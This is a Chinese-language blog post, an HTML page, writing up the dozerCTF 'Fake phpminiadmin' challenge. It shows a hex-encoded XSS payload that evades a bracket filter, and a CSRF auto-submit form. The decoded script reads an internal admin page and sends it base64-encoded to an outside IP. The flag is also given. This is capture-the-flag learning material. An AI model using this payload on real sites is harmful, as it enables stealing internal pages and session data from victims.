@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>dozerCTF - Fake phpminiadmin | AFKL&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言emmm虽然标题这么说有一点标题党，但我的确从这道CTF中认识到了XSS的作用可不止盗cookie">
+<meta property="og:type" content="article">
+<meta property="og:title" content="dozerCTF - Fake phpminiadmin">
+<meta property="og:url" content="http://yoursite.com/2020/06/17/dozerCTF-Fake-phpminiadmin/index.html">
+<meta property="og:site_name" content="AFKL&#39;s Blog">
+<meta property="og:description" content="前言emmm虽然标题这么说有一点标题党，但我的确从这道CTF中认识到了XSS的作用可不止盗cookie">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-06-16T16:33:00.000Z">
+<meta property="article:modified_time" content="2020-06-26T15:54:17.301Z">
+<meta property="article:author" content="AFKL">
+<meta property="article:tag" content="Blog">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="AFKL&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">AFKL&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-dozerCTF-Fake-phpminiadmin" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/06/17/dozerCTF-Fake-phpminiadmin/" class="article-date">
+  <time datetime="2020-06-16T16:33:00.000Z" itemprop="datePublished">2020-06-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      dozerCTF - Fake phpminiadmin
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>emmm虽然标题这么说有一点标题党，但我的确从这道CTF中认识到了XSS的作用可不止盗cookie</p>
+<h1 id="Fake-phpminiadmin"><a href="#Fake-phpminiadmin" class="headerlink" title="Fake phpminiadmin"></a>Fake phpminiadmin</h1><p>这道题开始给了一个页面可以执行sql语句。刚开始以为是sql注入之类的，但实际上在上面的一栏中有contact选项。明显是一道和xss有关的题了。</p>
+<h2 id="可以xss的点"><a href="#可以xss的点" class="headerlink" title="可以xss的点"></a>可以xss的点</h2><p>那么首先要找到可以xss的点，尝试在输出sql语句输出的地方插入js语句，发现<code>&lt;&gt;</code>尖括号被过滤了，证明这个地方有鬼。</p>
+<pre><code># 尝试以下语句，被阻拦
+select &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;
+# 尝试hex绕过，成功弹窗
+select 0x3C7363726970743E616C6572742831293C2F7363726970743E;</code></pre><p>接下来便是该想办法怎么样让机器人执行这里的sql。这里的sql数据使用了post，无法直接将带有弹窗数据的url直接发给机器人。<br>这里我想了两种方法：</p>
+<ol>
+<li>利用iframe+xss截图实现。</li>
+<li>利用CSRF进行跳转。</li>
+</ol>
+<p>首先一是不行的，进行测验，iframe只会在加载完js之后才会进行加载。导致无论如何利用js截图，都只能截到一个白框。<br>看起来只能跳转了。</p>
+<h2 id="利用CSRF进行跳转"><a href="#利用CSRF进行跳转" class="headerlink" title="利用CSRF进行跳转"></a>利用CSRF进行跳转</h2><p>首先机器人是不会对网址进行验证的，故我们可以在自己的vps上安置一个CSRF来对进行一个跳转。<br>不过，在当时我先是利用xss平台来确认一下机器人的cookie什么的，发现机器人的session没有特殊信息，但referrer给了一个特殊的网址：<code>http://127.0.0.1/admin_shark.php</code>,看起来这个内网的连接有东西。这更加证明了我们需要csrf来进行跳转，否则同源策略会阻挡我们获取这个内网连接的源码。<br>这里有一个点，便是admin_shark.php在外网下也可以访问，只不过会被拦截，提示你需要在内网访问。这代表着这个内网的服务器和公网的服务器是同一个（或者是是相同的）<br>数据被放置在了 <code>https://www.afkl.ml/xss.php</code>现在应该还能看到。在当时被安放了这么一组数据：</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;form action=&quot;http://127.0.0.1/sql.php&quot; id=&quot;sql&quot; method=&quot;post&quot;&gt;
+  &lt;input type=text name=&quot;sql&quot; value=&quot;select 0x3C7343724970743E76617220743D6E657720584D4C487474705265717565737428293B742E6F70656E2822474554222C2261646D696E5F736861726B2E706870222C66616C7365293B742E73656E6428293B286E657720496D616765292E7372633D22687474703A2F2F34372E39342E3233392E3139342F3F6F75743D222B62746F6128742E726573706F6E736554657874293B3C2F7343526970543E;&quot; /&gt;
+&lt;/form&gt;
+&lt;script&gt;
+  var f = document.getElementById(&quot;sql&quot;);
+  f.submit();
+&lt;/script&gt;
+&lt;h1&gt;it works!&lt;/h1&gt; </code></pre><p>本质是是构建了一个表单，下面的js会令其强制POST表单内容(PS:foxfire会弹窗询问是否提交表单，但chrome不会)<br>其中hex后的内容是</p>
+<pre><code>&lt;sCrIpt&gt;var t=new XMLHttpRequest();t.open(&quot;GET&quot;,&quot;admin_shark.php&quot;,false);t.send();(new Image).src=&quot;http://47.94.239.194/?out=&quot;+btoa(t.responseText);&lt;/sCRipT&gt;
+(上面是我的测试vps)</code></pre><p>在测试vps上开启监听，提交url，静候佳音即可。</p>
+<pre><code>flag:Dozerctf{eed8cdc400dfd4ec85dff70a170066b7}</code></pre><p>PS:可惜当时没有知道beef-xss，知道了这道题就有趣多了（</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2020/06/17/dozerCTF-Fake-phpminiadmin/" data-id="ckbweck8r00058892dtcda48t" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2020/05/24/BJDCTF-3rd-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">BJDCTF 3rd-小知识点</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/06/17/dozerCTF-Fake-phpminiadmin/">dozerCTF - Fake phpminiadmin</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/24/BJDCTF-3rd-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/">BJDCTF 3rd-小知识点</a>
+          </li>
+        
+          <li>
+            <a href="/2020/05/11/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E5%B0%8F%E7%9F%A5%E8%AF%86%E7%82%B9/">网鼎杯2020-小知识点</a>
+          </li>
+        
+          <li>
+            <a href="/2020/04/21/HFCTF2020-uploadBaby/">HFCTF2020-uploadBaby</a>
+          </li>
+        
+          <li>
+            <a href="/2020/03/17/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/">C语言实现学生信息管理系统</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2020 AFKL<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
